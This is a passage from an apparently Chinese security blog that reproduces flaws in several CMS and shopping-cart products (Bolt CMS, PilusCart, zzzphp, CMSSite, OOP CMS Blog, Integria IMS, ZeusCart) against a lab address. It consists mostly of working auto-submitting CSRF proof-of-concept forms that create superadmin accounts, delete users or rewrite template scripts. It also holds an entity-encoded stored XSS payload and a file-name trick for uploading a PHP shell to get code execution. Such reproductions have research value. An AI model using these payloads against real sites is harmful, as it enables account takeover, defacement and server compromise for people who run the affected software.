class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;title&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test<span class="symbol">&amp;#95;</span>01&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;slug&quot;</span> <span class="attr">value</span>=<span class="string">&quot;test<span class="symbol">&amp;#45;</span>01&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;image<span class="symbol">&amp;#91;</span>file<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;files<span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;teaser&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;body&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#x0d;</span><span class="symbol">&amp;#x3c;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x76;</span><span class="symbol">&amp;#x67;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x6e;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x6f;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x64;</span><span class="symbol">&amp;#x3d;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3e;</span><span class="symbol">&amp;#x0a;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;template&quot;</span> <span class="attr">value</span>=<span class="string">&quot;page<span class="symbol">&amp;#46;</span>twig&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;taxonomy<span class="symbol">&amp;#91;</span>groups<span class="symbol">&amp;#93;</span><span class="symbol">&amp;#91;</span><span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;taxonomy<span class="symbol">&amp;#45;</span>order<span class="symbol">&amp;#91;</span>groups<span class="symbol">&amp;#93;</span>&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;status&quot;</span> <span class="attr">value</span>=<span class="string">&quot;draft&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datepublish&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2023<span class="symbol">&amp;#45;</span>05<span class="symbol">&amp;#45;</span>07<span class="symbol">&amp;#32;</span>10<span class="symbol">&amp;#58;</span>29<span class="symbol">&amp;#58;</span>08&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;datedepublish&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;ownerid&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;<span class="symbol">&amp;#95;</span>live<span class="symbol">&amp;#45;</span>editor<span class="symbol">&amp;#45;</span>preview&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="code-execution"><a href="#code-execution" class="headerlink" title="code execution"></a>code execution</h3><p>在文件上传页面，上传一个 php shell code，但需要先修改为 .html，然后再重命名为 <code>.php\.</code>，会被自动修改为 <code>.php</code>。</p><p>详细分析：<a href="https://dl.packetstormsecurity.net/2007-exploits/boltcms370-xssxsrfexec.txt">https://dl.packetstormsecurity.net/2007-exploits/boltcms370-xssxsrfexec.txt</a></p><h2 id="02-PilusCart-1-4-1"><a href="#02-PilusCart-1-4-1" class="headerlink" title="02 PilusCart 1.4.1"></a>02 PilusCart 1.4.1</h2><p>后台地址：<a href="http://192.168.29.140/pilus/cabin/login.php">http://192.168.29.140/pilus/cabin/login.php</a></p><p>在添加新用户界面存在 CSRF，使用 burp 生成 PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/pilus/cabin/index.php?module=users&amp;action=newUser&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;session<span class="symbol">&amp;#95;</span>id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>login&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ssadmin1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>fullname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ssadminff&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ssadmin1<span class="symbol">&amp;#64;</span>mail<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ssadmin1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;confirm<span class="symbol">&amp;#95;</span>pass&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ssadmin1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>level&quot;</span> <span class="attr">value</span>=<span class="string">&quot;superadmin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;admin<span class="symbol">&amp;#95;</span>url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ssadmin1<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;saveAdmin&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Simpan&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="03-zzzphp-CMS-1-6-1"><a href="#03-zzzphp-CMS-1-6-1" class="headerlink" title="03 zzzphp CMS 1.6.1"></a>03 zzzphp CMS 1.6.1</h2><p>其绝大部分编辑内容或者修改内容都是单个 POST <code>save.php?act=xxx</code> 完成，且没有对 Referer 的校验与 token 的校验；<br>比如：在模板管理页面下的 模板编辑 中，存在 csrf 漏洞。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/zzzphp/admin537/save.php?act=editfile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#47;</span>zzzphp<span class="symbol">&amp;#47;</span>template<span class="symbol">&amp;#47;</span>pc<span class="symbol">&amp;#47;</span>cn2016<span class="symbol">&amp;#47;</span>js<span class="symbol">&amp;#47;</span>banner<span class="symbol">&amp;#95;</span>js<span class="symbol">&amp;#46;</span>js&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filetext&quot;</span> <span class="attr">value</span>=<span class="string">&quot;alert(123);&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="04-CMSSite-1-0"><a href="#04-CMSSite-1-0" class="headerlink" title="04 CMSSite 1.0"></a>04 CMSSite 1.0</h2><p>添加、删除，修改用户都存在 csrf 漏洞，以添加为例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/cmssite/admin/users.php?source=add_user&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>firstname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>lastname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>image&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;#45;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>role&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Admin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;amdin<span class="symbol">&amp;#64;</span>admin<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user<span class="symbol">&amp;#95;</span>password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;create<span class="symbol">&amp;#95;</span>user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Add<span class="symbol">&amp;#32;</span>User&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="05-OOP-CMS-Blog-1-0"><a href="#05-OOP-CMS-Blog-1-0" class="headerlink" title="05 OOP CMS Blog 1.0"></a>05 OOP CMS Blog 1.0</h2><p>在页面编辑，用户管理页面都能够找到 csrf，以添加用户为例</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/oop/admin/addUser.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;userName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;adminott&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin123&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin123<span class="symbol">&amp;#64;</span>admin<span class="symbol">&amp;#46;</span>com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;details&quot;</span> <span class="attr">value</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>p<span class="symbol">&amp;gt;</span>123465<span class="symbol">&amp;lt;</span><span class="symbol">&amp;#47;</span>p<span class="symbol">&amp;gt;</span>&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;role&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Create&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="06-Integria-IMS-5-0-83"><a href="#06-Integria-IMS-5-0-83" class="headerlink" title="06 Integria IMS 5.0.83"></a>06 Integria IMS 5.0.83</h2><p>垃圾系统没法创建用户，应该是在删除用户是存在 csrf：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/integriaims/ajax.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;page&quot;</span> <span class="attr">value</span>=<span class="string">&quot;include<span class="symbol">&amp;#47;</span>ajax<span class="symbol">&amp;#47;</span>delete<span class="symbol">&amp;#95;</span>item<span class="symbol">&amp;#95;</span>general&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;delete<span class="symbol">&amp;#95;</span>item&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;delete<span class="symbol">&amp;#95;</span>users&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      history.<span class="title function_">pushState</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="07-ZeusCart-4-0"><a href="#07-ZeusCart-4-0" class="headerlink" title="07 ZeusCart 4.0"></a>07 ZeusCart 4.0</h2><p>在 Sub Admin Management 页面存在 csrf，如添加新子管理员，构造 PoC：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.29.140/zeuscart/admin/?do=subadminmgt&amp;action=insert&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;subadminname&quot;</span> <span class="attr">value</span>=<span class="string">&quot;subadmss&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span 